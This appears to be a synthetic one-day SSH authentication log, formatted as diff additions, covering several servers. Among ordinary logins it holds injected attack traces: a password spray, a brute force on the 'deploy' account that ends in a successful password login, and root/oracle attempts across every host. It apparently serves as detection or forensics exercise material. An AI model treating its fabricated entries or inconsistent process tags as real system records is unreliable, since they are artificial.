+Oct 20 11:02:19 web-01 su: sshd[5458]: Failed password for ifeoma from 198.51.100.44 port 55962 ssh2
+Oct 20 11:04:04 web-01 systemd-logind: sshd[23491]: Accepted publickey for chioma from 10.0.8.9 port 57783 ssh2: ED25519 SHA256:hJB45LJqiBCXoDRU
+Oct 20 11:07:23 worker-02 sshd: sshd[19370]: Accepted publickey for fatima from 192.168.1.24 port 61846 ssh2: ED25519 SHA256:Z03EkKSTw0im2I66
+Oct 20 11:17:28 db-01 sudo: sshd[20947]: Failed password for ada from 192.168.1.24 port 44806 ssh2
+Oct 20 11:23:26 db-01 sshd: sshd[27624]: Accepted publickey for amara from 198.51.100.23 port 35071 ssh2: ED25519 SHA256:L9Cb54ZECaNXAViB
+Oct 20 11:40:00 auth-gw-01 sshd[13100]: Failed password for admin from 203.0.113.62 port 42000 ssh2
+Oct 20 11:40:19 auth-gw-01 sshd[13101]: Failed password for deploy from 203.0.113.62 port 42001 ssh2
+Oct 20 11:40:38 auth-gw-01 sshd[13102]: Failed password for backup from 203.0.113.62 port 42002 ssh2
+Oct 20 11:40:57 auth-gw-01 sshd[13103]: Failed password for postgres from 203.0.113.62 port 42003 ssh2
+Oct 20 11:41:16 auth-gw-01 sshd[13104]: Failed password for jenkins from 203.0.113.62 port 42004 ssh2
+Oct 20 11:41:35 auth-gw-01 sshd[13105]: Failed password for guest from 203.0.113.62 port 42005 ssh2
+Oct 20 11:41:54 auth-gw-01 sshd[13106]: Failed password for monitor from 203.0.113.62 port 42006 ssh2
+Oct 20 11:42:13 auth-gw-01 sshd[13107]: Failed password for svc_api from 203.0.113.62 port 42007 ssh2
+Oct 20 11:42:21 auth-gw-01 cron: sshd[22459]: Failed password for ifeoma from 203.0.113.17 port 36234 ssh2
+Oct 20 11:42:32 auth-gw-01 sshd[13108]: Failed password for root from 203.0.113.62 port 42008 ssh2
+Oct 20 11:42:51 auth-gw-01 sshd[13109]: Failed password for tunde from 203.0.113.62 port 42009 ssh2
+Oct 20 11:43:10 auth-gw-01 sshd[13110]: Failed password for ada from 203.0.113.62 port 42010 ssh2
+Oct 20 11:43:27 db-01 sshd: sshd[8491]: Accepted publickey for emeka from 10.0.2.15 port 63092 ssh2: ED25519 SHA256:ETtAMI60T7aFWOzU
+Oct 20 11:43:29 auth-gw-01 sshd[13111]: Failed password for chioma from 203.0.113.62 port 42011 ssh2
+Oct 20 11:43:48 auth-gw-01 sshd[13112]: Failed password for kunle from 203.0.113.62 port 42012 ssh2
+Oct 20 11:44:07 auth-gw-01 sshd[13113]: Failed password for fatima from 203.0.113.62 port 42013 ssh2
+Oct 20 11:44:26 auth-gw-01 sshd[13114]: Failed password for bayo from 203.0.113.62 port 42014 ssh2
+Oct 20 11:44:45 auth-gw-01 sshd[13115]: Failed password for ngozi from 203.0.113.62 port 42015 ssh2
+Oct 20 11:47:36 bastion-01 sudo: sshd[15461]: Accepted publickey for tunde from 192.168.1.31 port 60429 ssh2: ED25519 SHA256:qdLnEVjfsEDVAARg
+Oct 20 11:52:03 auth-gw-01 su: systemd-logind[19237]: New session 222 of user sani.
+Oct 20 11:55:52 auth-gw-01 systemd-logind: sshd[6676]: Accepted publickey for admin from 192.168.1.24 port 36243 ssh2: ED25519 SHA256:i9NiroASZhg6Gjsz
+Oct 20 12:01:25 web-01 cron: sshd[10947]: Accepted publickey for sani from 192.168.1.31 port 40639 ssh2: ED25519 SHA256:2Eom1OTlCiZ8Oy1f
+Oct 20 12:05:14 api-01 su: sshd[24234]: Accepted publickey for ngozi from 10.0.4.22 port 42097 ssh2: ED25519 SHA256:IV3m4JBV62Oafjbt
+Oct 20 12:09:32 worker-02 su: CRON[4863]: (svc_api) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 20 12:09:59 api-01 su: systemd-logind[3794]: New session 343 of user kunle.
+Oct 20 12:10:07 worker-02 su: sshd[3562]: Accepted publickey for kunle from 10.0.8.9 port 46231 ssh2: ED25519 SHA256:51fjyLyo5nGlQd2U
+Oct 20 12:13:12 worker-02 polkitd: sshd[7110]: Accepted publickey for emeka from 10.0.8.9 port 47173 ssh2: ED25519 SHA256:YsHeGx005ALpA0kE
+Oct 20 12:19:40 api-01 sshd: sshd[19992]: Accepted publickey for ngozi from 10.0.2.15 port 59824 ssh2: ED25519 SHA256:wWL9oydCqRwXoyNr
+Oct 20 12:21:51 auth-gw-01 sshd: sshd[10811]: Accepted publickey for svc_api from 172.16.5.12 port 58689 ssh2: ED25519 SHA256:4RAUtzx1FisdAOTt
+Oct 20 12:25:00 web-01 sshd: sshd[6150]: Invalid user git from 10.0.2.15 port 32012
+Oct 20 12:28:28 bastion-01 cron: sshd[3604]: Accepted publickey for svc_api from 203.0.113.17 port 63094 ssh2: ED25519 SHA256:HMiV414YnaZWKx2K
+Oct 20 12:40:57 worker-02 sshd: sshd[25207]: Accepted publickey for deploy from 192.168.1.31 port 57106 ssh2: ED25519 SHA256:8yw63RUf6Ae7wKHk
+Oct 20 12:42:03 api-01 su: sshd[8908]: Failed password for ifeoma from 203.0.113.17 port 56912 ssh2
+Oct 20 12:44:42 bastion-01 sshd: systemd-logind[1225]: New session 188 of user amara.
+Oct 20 12:52:44 web-01 systemd-logind: sshd[26543]: Failed password for backup from 10.0.8.9 port 36952 ssh2
+Oct 20 12:52:45 db-01 su: CRON[4389]: (backup) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 20 12:56:13 worker-02 sshd: sshd[25208]: Accepted publickey for chioma from 198.51.100.44 port 59677 ssh2: ED25519 SHA256:rOGGpvTHUjV6eVCt
+Oct 20 13:04:27 api-01 sudo: sshd[23133]: Accepted publickey for root from 198.51.100.23 port 30818 ssh2: ED25519 SHA256:1BkzLLBDS2sh9fo1
+Oct 20 13:04:57 db-01 su: sshd[7867]: Accepted publickey for fatima from 198.51.100.44 port 33559 ssh2: ED25519 SHA256:qMp4cY5Ff56Oc4tY
+Oct 20 13:08:41 worker-02 cron: sshd[10105]: Accepted publickey for fatima from 10.0.2.15 port 54290 ssh2: ED25519 SHA256:TJBuDkEc4t9QSqDD
+Oct 20 13:09:19 api-01 cron: sshd[23480]: Accepted publickey for backup from 198.51.100.44 port 62008 ssh2: ED25519 SHA256:Vh6Vba1uR4FeyxXZ
+Oct 20 13:32:30 auth-gw-01 cron: sshd[25993]: Accepted publickey for bayo from 192.168.1.31 port 32574 ssh2: ED25519 SHA256:DauHdo6xZWEk4PIZ
+Oct 20 13:51:34 auth-gw-01 systemd-logind: sshd[9478]: Accepted publickey for sani from 198.51.100.23 port 37385 ssh2: ED25519 SHA256:m2HG9HE5VGrM1wMl
+Oct 20 13:55:53 api-01 sshd: sshd[9830]: Accepted publickey for ngozi from 198.51.100.44 port 33010 ssh2: ED25519 SHA256:M3lzZh3f4BBCV1Jl
+Oct 20 13:58:03 db-01 sshd: sshd[7082]: Accepted publickey for fatima from 172.16.5.12 port 47315 ssh2: ED25519 SHA256:CliNuj02DUZg6lLp
+Oct 20 14:04:06 worker-02 systemd-logind: sshd[22831]: Failed password for deploy from 198.51.100.23 port 32439 ssh2
+Oct 20 14:06:18 auth-gw-01 sshd: sudo[21791]: emeka : TTY=pts/5 ; PWD=/home/emeka ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+Oct 20 14:08:09 auth-gw-01 su: sshd[28689]: Failed password for emeka from 10.0.2.15 port 46555 ssh2
+Oct 20 14:18:40 db-01 su: systemd-logind[23398]: New session 327 of user fatima.
+Oct 20 14:27:02 db-01 sshd: sshd[8487]: Accepted publickey for root from 172.16.5.12 port 62930 ssh2: ED25519 SHA256:sFc4Cb1ivJ3tjiX9
+Oct 20 14:40:25 bastion-01 polkitd: systemd-logind[11011]: New session 300 of user backup.
+Oct 20 14:48:48 db-01 sudo: sshd[18718]: Accepted publickey for bayo from 203.0.113.17 port 63072 ssh2: ED25519 SHA256:2Aed0BSDQpnLmbOV
+Oct 20 15:04:07 bastion-01 su: sshd[16261]: Accepted publickey for deploy from 10.0.2.15 port 48911 ssh2: ED25519 SHA256:Y8K3aDDmth9SHHPV
+Oct 20 15:05:00 web-01 sshd[14000]: Failed password for deploy from 192.0.2.88 port 43000 ssh2
+Oct 20 15:05:17 web-01 sshd[14001]: Failed password for deploy from 192.0.2.88 port 43001 ssh2
+Oct 20 15:05:34 web-01 sshd[14002]: Failed password for deploy from 192.0.2.88 port 43002 ssh2
+Oct 20 15:05:51 web-01 sshd[14003]: Failed password for deploy from 192.0.2.88 port 43003 ssh2
+Oct 20 15:06:08 web-01 sshd[14004]: Failed password for deploy from 192.0.2.88 port 43004 ssh2
+Oct 20 15:06:25 web-01 sshd[14005]: Failed password for deploy from 192.0.2.88 port 43005 ssh2
+Oct 20 15:06:42 web-01 sshd[14006]: Failed password for deploy from 192.0.2.88 port 43006 ssh2
+Oct 20 15:06:59 web-01 sshd[14007]: Failed password for deploy from 192.0.2.88 port 43007 ssh2
+Oct 20 15:07:16 web-01 sshd[14008]: Failed password for deploy from 192.0.2.88 port 43008 ssh2
+Oct 20 15:08:00 web-01 sshd[14020]: Accepted password for deploy from 192.0.2.88 port 43111 ssh2
+Oct 20 15:09:00 systemd-logind[14021] systemd-logind[14021]: New session 811 of user deploy.
+Oct 20 15:17:46 bastion-01 sshd: sshd[10902]: Failed password for svc_api from 10.0.2.15 port 46489 ssh2
+Oct 20 15:23:34 web-01 cron: sshd[4726]: Failed password for admin from 10.0.8.9 port 34710 ssh2
+Oct 20 15:26:30 worker-02 sudo: sshd[8202]: Accepted publickey for emeka from 203.0.113.17 port 51187 ssh2: ED25519 SHA256:i3T1bVZhAJvlKnat
+Oct 20 15:28:26 api-01 systemd-logind: systemd-logind[14910]: New session 81 of user admin.
+Oct 20 15:28:47 api-01 sshd: sshd[4560]: Failed password for svc_api from 172.16.5.12 port 62054 ssh2
+Oct 20 15:30:21 bastion-01 polkitd: sshd[2228]: Accepted publickey for deploy from 198.51.100.44 port 30408 ssh2: ED25519 SHA256:9TCiqlDB7j7yH6lZ
+Oct 20 15:30:39 bastion-01 sshd: sshd[2484]: Accepted publickey for emeka from 10.0.2.15 port 39016 ssh2: ED25519 SHA256:HxeH2STOXGFueiKw
+Oct 20 15:35:03 worker-02 cron: CRON[27996]: (root) CMD (/usr/local/bin/health-check)
+Oct 20 15:35:08 db-01 su: sshd[15023]: Accepted publickey for admin from 198.51.100.44 port 60484 ssh2: ED25519 SHA256:3FfX8akkPz3RLZQL
+Oct 20 15:37:59 web-01 sshd: sshd[13036]: Accepted publickey for emeka from 10.0.4.22 port 46344 ssh2: ED25519 SHA256:Yuno5x1XbiOn6Kdn
+Oct 20 15:43:26 auth-gw-01 sshd: sudo[15109]: root : TTY=pts/0 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 20 15:45:13 bastion-01 sudo: systemd-logind[14300]: New session 375 of user deploy.
+Oct 20 15:51:57 bastion-01 systemd-logind: sudo[15544]: kunle : TTY=pts/3 ; PWD=/home/kunle ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 20 15:53:58 auth-gw-01 su: CRON[7338]: (backup) CMD (/usr/local/bin/rotate-logs)
+Oct 20 15:54:11 db-01 sudo: sshd[9376]: Accepted publickey for sani from 10.0.8.9 port 47019 ssh2: ED25519 SHA256:MLMbJN6nd5aNKwcf
+Oct 20 16:00:36 api-01 su: sshd[11471]: Failed password for fatima from 198.51.100.44 port 63255 ssh2
+Oct 20 16:00:53 db-01 sudo: sshd[19212]: Invalid user git from 192.168.1.24 port 38588
+Oct 20 16:00:55 worker-02 systemd-logind: sshd[16088]: Accepted publickey for backup from 10.0.2.15 port 56227 ssh2: ED25519 SHA256:qdnTNWZvCahHMEyx
+Oct 20 16:09:26 db-01 systemd-logind: sshd[17182]: Failed password for tunde from 172.16.5.12 port 32116 ssh2
+Oct 20 16:09:27 api-01 sshd: sudo[26835]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Oct 20 16:10:16 db-01 su: sshd[24803]: Accepted publickey for backup from 10.0.4.22 port 63840 ssh2: ED25519 SHA256:360eP4cVIOQkuYGO
+Oct 20 16:24:22 worker-02 sshd: sshd[21351]: Accepted publickey for amara from 192.168.1.24 port 33530 ssh2: ED25519 SHA256:MF1DWqK0hqfDv6oC
+Oct 20 16:24:23 worker-02 cron: sudo[13430]: emeka : TTY=pts/2 ; PWD=/home/emeka ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Oct 20 16:25:46 api-01 sudo: sshd[7409]: Failed password for emeka from 10.0.2.15 port 38469 ssh2
+Oct 20 16:26:38 worker-02 su: sshd[7301]: Failed password for svc_api from 203.0.113.17 port 39013 ssh2
+Oct 20 16:30:16 worker-02 sshd: sshd[15205]: Failed password for emeka from 198.51.100.44 port 54731 ssh2
+Oct 20 16:34:34 api-01 su: sshd[17283]: Invalid user user1 from 192.168.1.24 port 41880
+Oct 20 16:38:16 web-01 systemd-logind: sshd[19506]: Failed password for svc_api from 198.51.100.44 port 33928 ssh2
+Oct 20 16:42:22 worker-02 cron: sshd[21965]: Invalid user support from 192.168.1.24 port 53575
+Oct 20 16:45:13 web-01 sshd: systemd-logind[11879]: New session 428 of user root.
+Oct 20 16:46:21 db-01 su: sudo[9341]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 20 16:55:19 auth-gw-01 systemd-logind: CRON[3982]: (svc_api) CMD (/usr/local/bin/rotate-logs)
+Oct 20 16:56:10 bastion-01 sshd: sshd[16474]: Failed password for admin from 198.51.100.23 port 56543 ssh2
+Oct 20 16:57:29 db-01 sshd: sshd[8852]: Accepted publickey for amara from 203.0.113.17 port 39447 ssh2: ED25519 SHA256:GlL0mvCdjWpzrbL4
+Oct 20 16:58:22 api-01 sshd: sshd[2930]: Accepted publickey for sani from 192.168.1.31 port 34908 ssh2: ED25519 SHA256:QB5ifn9WtKT9oyPA
+Oct 20 16:59:02 auth-gw-01 su: sudo[7467]: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Oct 20 17:02:24 worker-02 su: sshd[23184]: Accepted publickey for kunle from 172.16.5.12 port 30421 ssh2: ED25519 SHA256:AXcuQ5XXubfU3dnD
+Oct 20 17:06:02 worker-02 cron: systemd-logind[971]: New session 427 of user tunde.
+Oct 20 17:08:28 web-01 cron: sshd[12570]: Accepted publickey for ifeoma from 10.0.2.15 port 34519 ssh2: ED25519 SHA256:I6BceVwpqdjsWN3z
+Oct 20 17:09:54 db-01 sshd: sshd[28040]: Accepted publickey for ifeoma from 192.168.1.31 port 33901 ssh2: ED25519 SHA256:oF84cUdb1nEkFKa0
+Oct 20 17:10:31 web-01 polkitd: sshd[26189]: Failed password for svc_api from 10.0.4.22 port 36863 ssh2
+Oct 20 17:15:05 db-01 sshd: sshd[7815]: Failed password for emeka from 10.0.2.15 port 41028 ssh2
+Oct 20 17:16:53 web-01 su: sudo[11507]: sani : TTY=pts/2 ; PWD=/home/sani ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 20 17:17:11 web-01 cron: sshd[24970]: Accepted publickey for root from 198.51.100.23 port 55574 ssh2: ED25519 SHA256:u9YdOCnhrlDAydni
+Oct 20 17:18:37 worker-02 sshd: sshd[18465]: Failed password for sani from 203.0.113.17 port 61160 ssh2
+Oct 20 17:26:18 api-01 cron: systemd-logind[5740]: New session 54 of user svc_api.
+Oct 20 17:36:32 api-01 sshd: sshd[17039]: Accepted publickey for ngozi from 198.51.100.23 port 32195 ssh2: ED25519 SHA256:JWxzpfGryIxunQms
+Oct 20 17:41:59 db-01 polkitd: sshd[9695]: Accepted publickey for ifeoma from 10.0.4.22 port 32949 ssh2: ED25519 SHA256:xJNQlrajaMoVxz4Q
+Oct 20 17:57:13 db-01 sshd: sshd[25209]: Invalid user support from 192.168.1.31 port 39169
+Oct 20 18:00:26 db-01 sudo: CRON[25182]: (backup) CMD (/usr/bin/python3 /opt/app/cleanup.py)
+Oct 20 18:03:59 api-01 systemd-logind: systemd-logind[28891]: New session 326 of user root.
+Oct 20 18:07:28 auth-gw-01 systemd-logind: CRON[2414]: (root) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 20 18:09:26 web-01 polkitd: sshd[28021]: Accepted publickey for fatima from 10.0.2.15 port 34714 ssh2: ED25519 SHA256:lIf85hK06hg4aTzS
+Oct 20 18:15:16 api-01 cron: sshd[1174]: Accepted publickey for deploy from 203.0.113.17 port 34217 ssh2: ED25519 SHA256:Db9UpLLOSJUC35Df
+Oct 20 18:16:26 db-01 su: sshd[21038]: Accepted publickey for chioma from 172.16.5.12 port 62302 ssh2: ED25519 SHA256:UbWhurAPxchGPLiV
+Oct 20 18:22:57 api-01 cron: systemd-logind[16096]: New session 102 of user tunde.
+Oct 20 18:24:32 web-01 sudo: sudo[17002]: backup : TTY=pts/2 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Oct 20 18:25:27 bastion-01 su: sudo[24178]: backup : TTY=pts/4 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+Oct 20 18:26:45 api-01 systemd-logind: sshd[22196]: Failed password for sani from 172.16.5.12 port 32231 ssh2
+Oct 20 18:34:10 auth-gw-01 su: sshd[13251]: Invalid user support from 192.168.1.31 port 37776
+Oct 20 18:39:39 bastion-01 systemd-logind: sshd[20366]: Accepted publickey for ngozi from 203.0.113.17 port 33208 ssh2: ED25519 SHA256:hgwUsAw7rSCwF2vW
+Oct 20 18:42:47 auth-gw-01 su: systemd-logind[26972]: New session 115 of user ifeoma.
+Oct 20 18:44:45 worker-02 sudo: sshd[7865]: Accepted publickey for kunle from 198.51.100.23 port 64463 ssh2: ED25519 SHA256:EdAUDLsbItBBpCou
+Oct 20 18:44:51 auth-gw-01 sudo: sshd[2130]: Accepted publickey for kunle from 192.168.1.31 port 57813 ssh2: ED25519 SHA256:TwqC6hxrtaP6cilF
+Oct 20 18:46:32 db-01 systemd-logind: sshd[18303]: Accepted publickey for svc_api from 203.0.113.17 port 54462 ssh2: ED25519 SHA256:YBpBmUAX7vsg1SBg
+Oct 20 18:52:20 web-01 sshd: sshd[6797]: Failed password for ngozi from 10.0.2.15 port 63571 ssh2
+Oct 20 18:53:17 api-01 polkitd: sshd[9365]: Accepted publickey for sani from 10.0.4.22 port 41792 ssh2: ED25519 SHA256:bnHGeOgAwzQgfggL
+Oct 20 18:55:54 bastion-01 cron: systemd-logind[26050]: New session 31 of user svc_api.
+Oct 20 18:58:01 web-01 polkitd: sshd[18672]: Invalid user user1 from 198.51.100.23 port 46287
+Oct 20 19:01:35 api-01 sudo: sshd[1646]: Accepted publickey for ngozi from 10.0.8.9 port 44951 ssh2: ED25519 SHA256:Nrk4NkkrmlIiU3pg
+Oct 20 19:10:32 db-01 su: sshd[16867]: Accepted publickey for fatima from 192.168.1.24 port 46542 ssh2: ED25519 SHA256:d3CilbP0qKfLDRV9
+Oct 20 19:13:24 web-01 systemd-logind: sshd[19315]: Accepted publickey for sani from 10.0.8.9 port 36089 ssh2: ED25519 SHA256:YV77iDh0XZB969Ho
+Oct 20 19:20:00 auth-gw-01 sshd[16000]: Invalid user oracle from 198.51.100.44 port 44000
+Oct 20 19:20:08 auth-gw-01 sshd[16100]: Failed password for root from 198.51.100.44 port 44100 ssh2
+Oct 20 19:20:31 web-01 sshd[16001]: Invalid user oracle from 198.51.100.44 port 44001
+Oct 20 19:20:39 web-01 sshd[16101]: Failed password for root from 198.51.100.44 port 44101 ssh2
+Oct 20 19:21:02 api-01 sshd[16002]: Invalid user oracle from 198.51.100.44 port 44002
+Oct 20 19:21:10 api-01 sshd[16102]: Failed password for root from 198.51.100.44 port 44102 ssh2
+Oct 20 19:21:33 db-01 sshd[16003]: Invalid user oracle from 198.51.100.44 port 44003
+Oct 20 19:21:41 db-01 sshd[16103]: Failed password for root from 198.51.100.44 port 44103 ssh2
+Oct 20 19:22:04 bastion-01 sshd[16004]: Invalid user oracle from 198.51.100.44 port 44004
+Oct 20 19:22:12 bastion-01 sshd[16104]: Failed password for root from 198.51.100.44 port 44104 ssh2
+Oct 20 19:22:35 worker-02 sshd[16005]: Invalid user oracle from 198.51.100.44 port 44005
+Oct 20 19:22:43 worker-02 sshd[16105]: Failed password for root from 198.51.100.44 port 44105 ssh2
+Oct 20 19:23:11 api-01 su: sshd[16608]: Failed password for kunle from 172.16.5.12 port 56183 ssh2
+Oct 20 19:26:43 auth-gw-01 polkitd: CRON[5383]: (svc_api) CMD (/usr/local/bin/health-check)
+Oct 20 19:36:25 auth-gw-01 cron: sshd[20800]: Accepted publickey for admin from 10.0.8.9 port 56395 ssh2: ED25519 SHA256:0i9sG2WKOglJQsM4
+Oct 20 19:36:35 api-01 sshd: systemd-logind[8367]: New session 133 of user root.
+Oct 20 19:43:58 db-01 sshd: sshd[12572]: Failed password for deploy from 203.0.113.17 port 58731 ssh2
+Oct 20 19:44:48 api-01 systemd-logind: sshd[12972]: Accepted publickey for svc_api from 192.168.1.24 port 41972 ssh2: ED25519 SHA256:CLL68XE3bERvcMCv
+Oct 20 19:49:30 bastion-01 sudo: sshd[8621]: Accepted publickey for admin from 198.51.100.23 port 56834 ssh2: ED25519 SHA256:6pkG3qAgxFzGAngB
+Oct 20 19:53:54 web-01 su: sshd[27574]: Accepted publickey for sani from 172.16.5.12 port 50672 ssh2: ED25519 SHA256:ReMqRdJalpu7gpFj
+Oct 20 19:54:31 worker-02 cron: systemd-logind[19878]: New session 499 of user kunle.
+Oct 20 20:00:34 db-01 cron: sudo[25645]: bayo : TTY=pts/1 ; PWD=/home/bayo ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Oct 20 20:03:38 auth-gw-01 sudo: sshd[22936]: Accepted publickey for backup from 10.0.2.15 port 41425 ssh2: ED25519 SHA256:Gvm6JF63tmrUBDfJ
+Oct 20 20:14:25 auth-gw-01 polkitd: systemd-logind[19519]: New session 287 of user ngozi.
+Oct 20 20:22:29 api-01 su: sshd[27635]: Accepted publickey for ifeoma from 192.168.1.24 port 61348 ssh2: ED25519 SHA256:wltgkPkCjiPlAMYh
+Oct 20 20:27:41 worker-02 cron: sshd[6287]: Accepted publickey for svc_api from 198.51.100.23 port 34245 ssh2: ED25519 SHA256:FMyXpa5DzlF9PNal
+Oct 20 20:29:23 api-01 sshd: sshd[27187]: Failed password for fatima from 10.0.2.15 port 62077 ssh2
+Oct 20 20:30:16 web-01 sudo: sshd[26516]: Failed password for deploy from 172.16.5.12 port 32055 ssh2
+Oct 20 20:35:05 worker-02 sshd: sshd[15250]: Failed password for tunde from 192.168.1.31 port 55472 ssh2
+Oct 20 20:35:55 web-01 su: sshd[22325]: Accepted publickey for svc_api from 192.168.1.24 port 53450 ssh2: ED25519 SHA256:ue8hGZGXlL7BDG8a
+Oct 20 20:35:58 db-01 sshd: sshd[8043]: Invalid user user1 from 192.168.1.24 port 47429
+Oct 20 20:37:06 web-01 polkitd: sshd[23354]: Accepted publickey for kunle from 198.51.100.44 port 32571 ssh2: ED25519 SHA256:URxFLD6fisacpiAn
+Oct 20 20:42:04 db-01 cron: sshd[14836]: Failed password for fatima from 10.0.4.22 port 30633 ssh2
+Oct 20 20:42:40 api-01 systemd-logind: sshd[16427]: Accepted publickey for ngozi from 198.51.100.23 port 48945 ssh2: ED25519 SHA256:rDCgvmI1v4Pl6e98
+Oct 20 20:47:51 api-01 polkitd: sshd[4404]: Accepted publickey for bayo from 203.0.113.17 port 42513 ssh2: ED25519 SHA256:E6Cj7KA2z0PbhDTp
+Oct 20 20:50:24 db-01 sudo: sshd[13094]: Accepted publickey for deploy from 203.0.113.17 port 46776 ssh2: ED25519 SHA256:D1Pa1j4u11h3DtrJ
+Oct 20 20:54:31 bastion-01 su: systemd-logind[10553]: New session 301 of user ada.
+Oct 20 20:55:54 api-01 polkitd: sshd[15755]: Accepted publickey for emeka from 10.0.2.15 port 35572 ssh2: ED25519 SHA256:6O3W1ZA7GajIpBjD
+Oct 20 21:05:56 worker-02 sshd: sshd[28983]: Accepted publickey for deploy from 192.168.1.31 port 52010 ssh2: ED25519 SHA256:F6jPpMuMNcbUS4gJ
+Oct 20 21:06:06 web-01 sshd: sshd[18135]: Invalid user oracle1 from 10.0.8.9 port 57591
+Oct 20 21:07:06 web-01 systemd-logind: sshd[2350]: Accepted publickey for emeka from 10.0.8.9 port 32343 ssh2: ED25519 SHA256:CWRS5RKiJb1YhCsN
+Oct 20 21:12:03 db-01 su: sshd[10561]: Accepted publickey for tunde from 192.168.1.24 port 57928 ssh2: ED25519 SHA256:JRlheMgkSMD9QHyV
+Oct 20 21:14:47 db-01 su: systemd-logind[1591]: New session 188 of user admin.
+Oct 20 21:24:57 auth-gw-01 sshd: sshd[9146]: Failed password for sani from 172.16.5.12 port 63488 ssh2
+Oct 20 21:25:33 worker-02 sshd: sshd[7232]: Failed password for chioma from 10.0.2.15 port 43906 ssh2
+Oct 20 21:28:46 db-01 systemd-logind: systemd-logind[7904]: New session 351 of user deploy.
+Oct 20 21:34:29 api-01 cron: CRON[4779]: (svc_api) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 20 21:39:55 bastion-01 polkitd: sshd[13468]: Accepted publickey for amara from 10.0.2.15 port 44415 ssh2: ED25519 SHA256:JEMT1dc36xTc2Uk1
+Oct 20 21:40:22 web-01 sshd: sshd[14142]: Failed password for fatima from 10.0.2.15 port 32280 ssh2
+Oct 20 21:41:16 bastion-01 systemd-logind: systemd-logind[8953]: New session 222 of user ada.
+Oct 20 21:43:32 db-01 polkitd: systemd-logind[17167]: New session 101 of user admin.
+Oct 20 21:46:19 api-01 sshd: sudo[3831]: amara : TTY=pts/4 ; PWD=/home/amara ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Oct 20 21:56:01 db-01 cron: systemd-logind[10530]: New session 406 of user deploy.
+Oct 20 21:57:57 api-01 polkitd: sshd[17356]: Accepted publickey for ifeoma from 192.168.1.24 port 31185 ssh2: ED25519 SHA256:AeO6dVHp6oEoe9s3
+Oct 20 21:59:36 auth-gw-01 su: sshd[13809]: Failed password for ifeoma from 192.168.1.31 port 32045 ssh2
+Oct 20 22:05:17 bastion-01 polkitd: sshd[9892]: Accepted publickey for fatima from 172.16.5.12 port 59317 ssh2: ED25519 SHA256:Q05J4TrPi24v9gdf
+Oct 20 22:05:45 bastion-01 sshd: sshd[14245]: Invalid user test from 192.168.1.24 port 57765
+Oct 20 22:07:10 auth-gw-01 systemd-logind: sshd[23908]: Failed password for bayo from 172.16.5.12 port 61205 ssh2
+Oct 20 22:13:20 api-01 cron: sshd[20351]: Accepted publickey for root from 198.51.100.44 port 35938 ssh2: ED25519 SHA256:2jgl6POV4xTtvhOg
+Oct 20 22:13:23 auth-gw-01 sshd: sshd[17782]: Accepted publickey for sani from 10.0.2.15 port 63462 ssh2: ED25519 SHA256:jDnXH4NfobYFVto7
+Oct 20 22:14:02 web-01 cron: sshd[7172]: Accepted publickey for root from 10.0.4.22 port 63027 ssh2: ED25519 SHA256:7YZCje8GAAhPkkMo
+Oct 20 22:15:54 web-01 su: sshd[18143]: Accepted publickey for fatima from 192.168.1.24 port 41004 ssh2: ED25519 SHA256:ZA8DhgqbPkCfkeZn
+Oct 20 22:19:07 bastion-01 systemd-logind: sshd[26547]: Accepted publickey for deploy from 203.0.113.17 port 59502 ssh2: ED25519 SHA256:6o5q31Ic6V1tS7Ox
+Oct 20 22:28:07 auth-gw-01 su: systemd-logind[5752]: New session 240 of user backup.
+Oct 20 22:41:51 api-01 su: sshd[5476]: Invalid user test from 192.168.1.24 port 62238
+Oct 20 22:42:29 bastion-01 cron: sshd[23365]: Accepted publickey for ada from 192.168.1.24 port 47462 ssh2: ED25519 SHA256:BaGgsXBKNuWaMdyY
+Oct 20 22:42:55 bastion-01 sshd: sshd[6024]: Accepted publickey for bayo from 203.0.113.17 port 41285 ssh2: ED25519 SHA256:EggZVRzlv73YpmoF
+Oct 20 22:48:08 bastion-01 sshd: sshd[20133]: Accepted publickey for ngozi from 198.51.100.44 port 44586 ssh2: ED25519 SHA256:rDKcmLid5EceTEiw
+Oct 20 22:57:56 web-01 sudo: sudo[5285]: emeka : TTY=pts/5 ; PWD=/home/emeka ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 20 22:59:52 auth-gw-01 sudo: sshd[28556]: Accepted publickey for ada from 10.0.4.22 port 31965 ssh2: ED25519 SHA256:JkySR5mXi0mQF2Fv
+Oct 20 23:01:45 worker-02 su: systemd-logind[28694]: New session 132 of user svc_api.
+Oct 20 23:08:35 web-01 sudo: sudo[22593]: kunle : TTY=pts/2 ; PWD=/home/kunle ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+Oct 20 23:21:35 bastion-01 polkitd: CRON[25147]: (root) CMD (/usr/local/bin/rotate-logs)
+Oct 20 23:23:01 api-01 sshd: sshd[16730]: Failed password for tunde from 10.0.2.15 port 60429 ssh2
+Oct 20 23:28:14 web-01 su: sshd[3363]: Accepted publickey for deploy from 198.51.100.23 port 30865 ssh2: ED25519 SHA256:BdwQGhtMYWHKEQ7A
+Oct 20 23:39:40 worker-02 su: sshd[14162]: Accepted publickey for ngozi from 10.0.2.15 port 53571 ssh2: ED25519 SHA256:58Vib3rpj2b59iLf
+Oct 20 23:53:00 worker-02 sudo: sshd[4498]: Invalid user oracle1 from 198.51.100.23 port 38070
+Oct 20 23:56:22 worker-02 cron: systemd-logind[23392]: New session 165 of user svc_api.
